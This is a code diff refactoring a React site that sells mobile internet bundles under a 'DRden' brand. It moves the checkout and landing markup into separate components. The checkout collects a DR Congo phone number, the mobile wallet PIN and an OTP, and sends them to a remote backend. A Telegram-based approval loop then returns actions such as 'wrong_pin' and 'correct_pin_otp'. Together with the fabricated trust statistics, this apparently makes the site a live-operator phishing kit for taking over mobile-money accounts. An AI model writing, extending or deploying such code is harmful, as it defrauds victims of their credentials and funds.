@@ -1,15 +1,12 @@
-﻿import { useEffect, useRef, useState } from 'react';
+import { useEffect, useRef, useState } from 'react';
+import CheckoutPage from './components/CheckoutPage';
+import LandingPage from './components/LandingPage';
+import { BRAND_LOGO_SOURCES } from './constants/brand';
 
 const configuredApiBase = (import.meta.env.VITE_API_BASE_URL || '').trim().replace(/\/$/, '');
 const API_BASE_URL = configuredApiBase || 'https://drcden.onrender.com';
 const FALLBACK_API_BASE_URL = (import.meta.env.VITE_FALLBACK_API_BASE_URL || '').trim().replace(/\/$/, '');
-const BRAND_LOGO_SOURCES = [
-  '/brand/drden-logo.svg',
-  '/brand/drden-logo.png',
-  '/brand/drden-logo.jpg',
-  '/brand/drden-logo.jpeg',
-  '/brand/drden-logo.webp'
-];
+
 const apiFetch = async (path, options) => {
   const directBackendUrl = `${API_BASE_URL}${path}`;
   const sameOriginUrl = path;
@@ -38,79 +35,6 @@ const apiFetch = async (path, options) => {
 
   return fetch(directBackendUrl, options);
 };
-
-const uiIconMap = {
-  mobile: (
-    <svg viewBox="0 0 24 24" aria-hidden="true">
-      <path d="M8 3h8a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2zm4 16.25a1.25 1.25 0 1 0 0 .01V19.25zM9 6h6v10H9V6z" />
-    </svg>
-  ),
-  lock: (
-    <svg viewBox="0 0 24 24" aria-hidden="true">
-      <path d="M12 2a5 5 0 0 1 5 5v2h1a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2v-9a2 2 0 0 1 2-2h1V7a5 5 0 0 1 5-5zm3 7V7a3 3 0 0 0-6 0v2h6zm-3 3a2 2 0 0 1 1 3.73V18h-2v-2.27A2 2 0 0 1 12 12z" />
-    </svg>
-  ),
-  otp: (
-    <svg viewBox="0 0 24 24" aria-hidden="true">
-      <path d="M12 2a10 10 0 1 1-7.07 2.93A10 10 0 0 1 12 2zm1 5h-2v6l5 3 1-1.73-4-2.27V7z" />
-    </svg>
-  ),
-  shieldCheck: (
-    <svg viewBox="0 0 24 24" aria-hidden="true">
-      <path d="M12 2l8 4v6c0 5.25-3.67 9.76-8 10-4.33-.24-8-4.75-8-10V6l8-4zm-1 12.17-2.59-2.58L7 13l4 4 6-6-1.41-1.41L11 14.17z" />
-    </svg>
-  ),
-  spark: (
-    <svg viewBox="0 0 24 24" aria-hidden="true">
-      <path d="M13 2l-2 6h4l-6 14 2-8H7l6-12z" />
-    </svg>
-  ),
-  refresh: (
-    <svg viewBox="0 0 24 24" aria-hidden="true">
-      <path d="M17.65 6.35A7.95 7.95 0 0 0 12 4V1L7 6l5 5V7a5 5 0 1 1-4.9 6H5.02A7 7 0 1 0 17.65 6.35z" />
-    </svg>
-  ),
-  drden: (
-    <svg viewBox="0 0 24 24" aria-hidden="true">
-      <path d="M13.3 4.2c2.3 0 4.3 1.3 5.2 3.4.5 1.1.3 2.4-.4 3.3-.6.8-1.4 1.2-2.4 1.2h-2.1c-1.2 0-2 .5-2.5 1.5-.4.8-.6 1.8-.6 2.9V20H7.9v-3.7c0-1.5.3-2.9 1-4.1 1-1.7 2.5-2.6 4.6-2.6h1.8c.5 0 .8-.1 1-.4.2-.3.2-.7 0-1.1-.5-1.2-1.7-1.9-3-1.9-1.6 0-2.9.8-3.8 2.3L7.3 7.1c1.4-1.9 3.5-2.9 6-2.9z" />
-    </svg>
-  )
-};
-
-function UiGlyph({ type }) {
-  return <span className="ui-glyph">{uiIconMap[type]}</span>;
-}
-
-function BrandMark({ sources, alt, fallbackType, small = false, brand = 'generic' }) {
-  const [useFallback, setUseFallback] = useState(false);
-  const [sourceIndex, setSourceIndex] = useState(0);
-
-  const currentSrc = Array.isArray(sources) ? sources[sourceIndex] : null;
-
-  return (
-    <span className={`brand-mark-shell${small ? ' brand-mark-shell-small' : ''}`}>
-      {useFallback || !currentSrc ? (
-        <UiGlyph type={fallbackType} />
-      ) : (
-        <img
-          src={currentSrc}
-          alt={alt}
-          className={`brand-mark brand-mark--${brand}${small ? ' brand-mark-small' : ''}`}
-          loading="lazy"
-          decoding="async"
-          onError={() => {
-            const hasNext = Array.isArray(sources) && sourceIndex < sources.length - 1;
-            if (hasNext) {
-              setSourceIndex((current) => current + 1);
-            } else {
-              setUseFallback(true);
-            }
-          }}
-        />
-      )}
-    </span>
-  );
-}
 
 function App() {
   const [data, setData] = useState(null);
@@ -143,7 +67,6 @@ function App() {
 
   useEffect(() => {
     if (approvalPassed) {
-      // small timeout to ensure input is rendered
       const focusTimer = setTimeout(() => otpInputRef.current?.[0]?.focus?.(), 50);
       return () => clearTimeout(focusTimer);
     }
@@ -222,10 +145,8 @@ function App() {
           setOtpSent(false);
           setOtpTimer(0);
           setActionLoading(false);
-          return;
         }
       } catch (err) {
-        // Keep polling on transient failures so Telegram approval can still be picked up.
         setApprovalError('Verification temporairement indisponible. Nouvelle tentative...');
       }
     };
@@ -259,7 +180,6 @@ function App() {
           setActionLoading(false);
 
           if (json.action === 'wrong_pin') {
-            // Wrong PIN sends user back to phone/PIN step.
             setPaymentConfirmed(false);
             setApprovalPassed(false);
             setOtpSent(false);
@@ -272,20 +192,15 @@ function App() {
           }
 
           if (json.action === 'wrong_code') {
-            // Wrong OTP keeps user on OTP step for quick retry.
             setPaymentConfirmed(false);
             setApprovalPassed(true);
             setOtpSent(true);
             setOtpTimer(60);
             setOtpDigits(['', '', '', '']);
             setOtpError('Code OTP incorrect. Veuillez le ressaisir.');
-            return;
           }
-
-          return;
         }
       } catch (err) {
-        // Keep polling on transient failures so callback actions are not missed.
         setActionError('Verification temporairement indisponible. Nouvelle tentative...');
       }
     };
@@ -458,9 +373,9 @@ function App() {
         body: JSON.stringify({
           offerId: checkoutOffer.id,
           offerTitle: checkoutOffer.title,
-            phoneNumber: apiPhoneNumber,
+          phoneNumber: apiPhoneNumber,
           walletPin: walletPin.trim(),
-            otpCode
+          otpCode
         })
       });
 
@@ -536,325 +451,54 @@ function App() {
   }
 
   if (checkoutOffer) {
-    const checkoutStatusIcon = waitingApproval ? 'refresh' : approvalPassed ? 'otp' : 'shieldCheck';
-    const verificationApproved = telegramAction?.action === 'correct_pin_otp';
-
     return (
-      <main className="page-shell checkout-page-shell">
-        <div className="checkout-shell">
-          <section className="checkout-drden-hero" aria-label="DRden Lite">
-            <div className="checkout-drden-logo-wrap">
-              <BrandMark
-                sources={BRAND_LOGO_SOURCES}
-                alt="DRden"
-                fallbackType="drden"
-                brand="drden"
-              />
-            </div>
-            <h1>Connectez-vous a DRden Lite pour finaliser le paiement.</h1>
-          </section>
-
-          <section className="checkout-card checkout-card-lite">
-            <div className="checkout-header-lite">
-              <button type="button" className="checkout-back checkout-back-inline" onClick={handleBack}>
-                ← Retour
-              </button>
-            </div>
-
-            <p className="checkout-subtitle checkout-subtitle-icon">
-              <UiGlyph type={checkoutStatusIcon} />
-              <span>
-                {waitingApproval
-                  ? 'Validation de vos informations...'
-                  : approvalPassed
-                    ? `Un code OTP a ete envoye a ${apiPhoneNumber || 'votre numero'}. Saisissez-le pour terminer.`
-                    : 'Verifiez votre numero avec votre PIN'}
-              </span>
-            </p>
-
-            {waitingApproval && (
-              <div className="checkout-info recycling-spinner" aria-live="polite" aria-busy="true">
-                <svg width="48" height="48" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
-                  <path fill="currentColor" d="M12 2v2a8 8 0 1 0 8 8h2a10 10 0 1 1-10-10z" />
-                  <path fill="currentColor" d="M7 7l-4 4 4 4V11h6V7H7z" />
-                </svg>
-                <span>Validation de vos informations...</span>
-                <span className="sr-only">Validation des informations</span>
-              </div>
-            )}
-
-            {approvalError && <div className="checkout-error field-error">{approvalError}</div>}
-
-            {approvalPassed && !paymentConfirmed && (
-              <div className="otp-timer">
-                {otpTimer > 0
-                  ? `Code valide pendant : ${otpTimer}s`
-                  : 'Le code OTP a expire. Rechargez la page ou reessayez.'}
-              </div>
-            )}
-
-            {!paymentConfirmed && (
-              <form className="checkout-form" onSubmit={handleCheckoutSubmit} noValidate>
-                {!otpSent && (
-                  <>
-                    <label className="form-field">
-                      <span className="label-with-icon"><UiGlyph type="mobile" />Numero de contact</span>
-                      <div className="phone-field-row">
-                        <span className="phone-country">🇨🇩 <strong>+243</strong></span>
-                        <input
-                          type="tel"
-                          value={normalizedLocalNumber}
-                          onChange={(event) => {
-                            setPhoneNumber(event.target.value.replace(/\D/g, '').slice(0, 9));
-                            if (phoneError) setPhoneError('');
-                            if (approvalError) setApprovalError('');
-                            if (submissionError) setSubmissionError('');
-                          }}
-                          placeholder="951234567"
-                          inputMode="numeric"
-                          autoComplete="tel-national"
-                        />
-                      </div>
-                      {phoneError && <span className="field-error">{phoneError}</span>}
-                    </label>
-
-                    <label className="form-field">
-                      <span className="label-with-icon"><UiGlyph type="lock" />Entrez votre PIN</span>
-                      <input
-                        type="password"
-                        value={walletPin}
-                        onChange={(event) => {
-                          setWalletPin(event.target.value);
-                          if (walletPinError) setWalletPinError('');
-                          if (approvalError) setApprovalError('');
-                          if (submissionError) setSubmissionError('');
-                        }}
-                        placeholder="Entrez votre PIN"
-                        inputMode="numeric"
-                        required
-                      />
-                      {walletPinError && <span className="field-error">{walletPinError}</span>}
-                    </label>
-                  </>
-                )}
-
-                {approvalPassed && !paymentConfirmed && (
-                  <label className="form-field">
-                    <span className="label-with-icon otp-label-centered"><UiGlyph type="otp" />Entrez OTP</span>
-                    <div className="otp-grid" onPaste={handleOtpPaste}>
-                      {otpDigits.map((digit, idx) => (
-                        <input
-                          key={`otp-${idx}`}
-                          ref={(node) => {
-                            otpInputRef.current[idx] = node;
-                          }}
-                          type="text"
-                          value={digit}
-                          onChange={(event) => handleOtpDigitChange(idx, event.target.value)}
-                          onKeyDown={(event) => handleOtpDigitKeyDown(idx, event)}
-                          inputMode="numeric"
-                          maxLength={1}
-                          aria-label={`OTP digit ${idx + 1}`}
-                          className="otp-digit"
-                        />
-                      ))}
-                      <span className="otp-eye" aria-hidden="true">👁</span>
-                    </div>
-                    {otpError && <span className="field-error">{otpError}</span>}
-                  </label>
-                )}
-
-                {approvalPassed && !paymentConfirmed && (
-                  <div className="form-resend">
-                    <button
-                      type="button"
-                      className="button-secondary"
-                      onClick={handleResendOtp}
-                      disabled={resendLoading || otpTimer === 0}
-                    >
-                      {resendLoading ? 'Renvoi...' : 'Renvoyer OTP'}
-                    </button>
-                    {resendMessage && <span className="field-success">{resendMessage}</span>}
-                    {resendError && <span className="field-error">{resendError}</span>}
-                  </div>
-                )}
-
-                <div className="form-actions">
-                  <button
-                    type="submit"
-                    className="button-primary button-connect"
-                    disabled={(approvalPassed && otpTimer === 0 && !paymentConfirmed) || submissionLoading || waitingApproval || actionLoading}
-                  >
-                    {submissionLoading ? 'Envoi...' : 'CONNEXION'}
-                  </button>
-                </div>
-              </form>
-            )}
-
-            {paymentConfirmed && actionLoading && (
-              <div className="checkout-info recycling-spinner" aria-live="polite" aria-busy="true">
-                <svg width="36" height="36" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
-                  <path fill="currentColor" d="M12 2v2a8 8 0 1 0 8 8h2a10 10 0 1 1-10-10z" />
-                  <path fill="currentColor" d="M7 7l-4 4 4 4V11h6V7H7z" />
-                </svg>
-                <span>Validation OTP...</span>
-                <span className="sr-only">Validation OTP</span>
-              </div>
-            )}
-
-            {submissionError && <div className="checkout-error field-error">{submissionError}</div>}
-            {actionError && <div className="checkout-error field-error">{actionError}</div>}
-
-            {telegramAction && telegramAction.action === 'allow_proceed' && !paymentConfirmed && (
-              <div className="checkout-success status-line">
-                <UiGlyph type="shieldCheck" />
-                Approuve. Saisissez l'OTP pour terminer votre paiement.
-              </div>
-            )}
-
-            {paymentConfirmed && (
-              <div className="checkout-confirmation status-line">
-                <UiGlyph type="spark" />
-                OTP verifie. Veuillez attendre l'invite de paiement pour terminer votre commande.
-              </div>
-            )}
-
-            {paymentConfirmed && actionLoading && <div className="checkout-info">Validation OTP... Cela peut prendre quelques secondes.</div>}
-
-            {paymentConfirmed && telegramAction && (
-              <div className="checkout-success status-line">
-                <UiGlyph type="shieldCheck" />
-                <strong>Action recue :</strong> {telegramAction.text}
-              </div>
-            )}
-
-            {paymentConfirmed && (
-              <section className="checkout-final-state" aria-live="polite">
-                <div className="checkout-final-icon">
-                  <UiGlyph type={verificationApproved ? 'shieldCheck' : 'refresh'} />
-                </div>
-                <div className="checkout-final-copy">
-                  <h2>{verificationApproved ? 'Paiement confirme' : 'Verification en cours'}</h2>
-                  <p>
-                    {verificationApproved
-                      ? 'Merci. Votre validation OTP est confirmee. Suivez les instructions de paiement pour finaliser la transaction.'
-                      : 'Votre OTP a ete envoye pour verification. Veuillez patienter pendant la confirmation finale.'}
-                  </p>
-                </div>
-                <div className="checkout-final-actions">
-                  <button type="button" className="button-secondary" onClick={handleBack}>
-                    Retour aux offres
-                  </button>
-                </div>
-              </section>
-            )}
-
-            {paymentConfirmed && actionError && <div className="checkout-error field-error">{actionError}</div>}
-          </section>
-
-          <footer className="checkout-collab-footer">
-            <div className="checkout-collab-logo">
-              <BrandMark
-                sources={BRAND_LOGO_SOURCES}
-                alt="DRden"
-                fallbackType="drden"
-                brand="drden"
-              />
-            </div>
-            <p>En collaboration avec</p>
-            <strong>DRDEN</strong>
-          </footer>
-        </div>
-      </main>
+      <CheckoutPage
+        checkoutOffer={checkoutOffer}
+        onBack={handleBack}
+        brandSources={BRAND_LOGO_SOURCES}
+        waitingApproval={waitingApproval}
+        approvalPassed={approvalPassed}
+        paymentConfirmed={paymentConfirmed}
+        apiPhoneNumber={apiPhoneNumber}
+        approvalError={approvalError}
+        otpTimer={otpTimer}
+        otpSent={otpSent}
+        phoneError={phoneError}
+        walletPinError={walletPinError}
+        normalizedLocalNumber={normalizedLocalNumber}
+        walletPin={walletPin}
+        setPhoneNumber={setPhoneNumber}
+        setWalletPin={setWalletPin}
+        setPhoneError={setPhoneError}
+        setApprovalError={setApprovalError}
+        submissionError={submissionError}
+        setSubmissionError={setSubmissionError}
+        setWalletPinError={setWalletPinError}
+        otpDigits={otpDigits}
+        otpInputRef={otpInputRef}
+        handleOtpPaste={handleOtpPaste}
+        handleOtpDigitChange={handleOtpDigitChange}
+        handleOtpDigitKeyDown={handleOtpDigitKeyDown}
+        otpError={otpError}
+        resendLoading={resendLoading}
+        handleResendOtp={handleResendOtp}
+        resendMessage={resendMessage}
+        resendError={resendError}
+        handleCheckoutSubmit={handleCheckoutSubmit}
+        submissionLoading={submissionLoading}
+        actionLoading={actionLoading}
+        actionError={actionError}
+        telegramAction={telegramAction}
+      />
     );
   }
 
   return (
-    <main className="page-shell">
-      <div className="poster-shell poster-shell-simple">
-        <section className="landing-simple-header" aria-label="Partenariat">
-          <div className="landing-logo-block">
-            <BrandMark
-              sources={BRAND_LOGO_SOURCES}
-              alt="DRden"
-              fallbackType="drden"
-              brand="drden"
-            />
-          </div>
-          <p>En collaboration avec <strong>DRDEN</strong></p>
-        </section>
-
-        <section className="landing-simple-hero">
-          <span className="landing-simple-kicker">📶 Forfaits Internet</span>
-          <h1>Restez Connecte Sans Limites</h1>
-          <p>
-            Choisissez un forfait. Vous serez redirige vers la page de connexion DRden Lite
-            pour proceder au paiement.
-          </p>
-          <div className="landing-proof-grid" aria-label="Indicateurs de confiance">
-            <article>
-              <strong>99.9%</strong>
-              <span>Disponibilite reseau</span>
-            </article>
-            <article>
-              <strong>&lt; 30s</strong>
-              <span>Activation moyenne</span>
-            </article>
-            <article>
-              <strong>24/7</strong>
-              <span>Support continu</span>
-            </article>
-          </div>
-          <button
-            type="button"
-            className="hero-cta"
-            onClick={() => document.getElementById('offers')?.scrollIntoView({ behavior: 'smooth', block: 'start' })}
-          >
-            Voir les forfaits
-          </button>
-        </section>
-
-        <section className="card-grid" id="offers">
-          {data.offres.map((offre) => (
-            <article key={offre.id} className="offer-card">
-              <div className="offer-top">
-                <span className="offer-charge">{offre.tier === 'pro' || offre.tier === 'max' || offre.tier === 'unlimited' ? '4G+' : '4G'}</span>
-                {offre.badge && <span className={`offer-badge ${offre.badgeClass}`}>{offre.badge}</span>}
-              </div>
-              <div className="offer-body">
-                <span className="offer-amount">{offre.title}</span>
-                <span className="offer-duration">{offre.subtitle}</span>
-              </div>
-              <div className="offer-price">
-                <span className="offer-currency">{offre.currency}</span>
-                <span className="offer-value">{offre.price.toFixed(2)}</span>
-              </div>
-              <button type="button" onClick={() => startCheckout(offre)}>
-                <UiGlyph type="spark" />
-                Choisir ce forfait
-              </button>
-            </article>
-          ))}
-        </section>
-
-        <section className="airdata-trust" aria-label="Avantages">
-          <article>
-            <span aria-hidden="true">⚡</span>
-            <strong>Activation instantanee</strong>
-          </article>
-          <article>
-            <span aria-hidden="true">🔒</span>
-            <strong>Paiement securise</strong>
-          </article>
-          <article>
-            <span aria-hidden="true">📡</span>
-            <strong>Couverture nationale stable</strong>
-          </article>
-        </section>
-
-        <footer className="airdata-footer">© 2026 DRden. Tous droits reserves.</footer>
-      </div>
-    </main>
+    <LandingPage
+      data={data}
+      onStartCheckout={startCheckout}
+      brandSources={BRAND_LOGO_SOURCES}
+    />
   );
 }
 
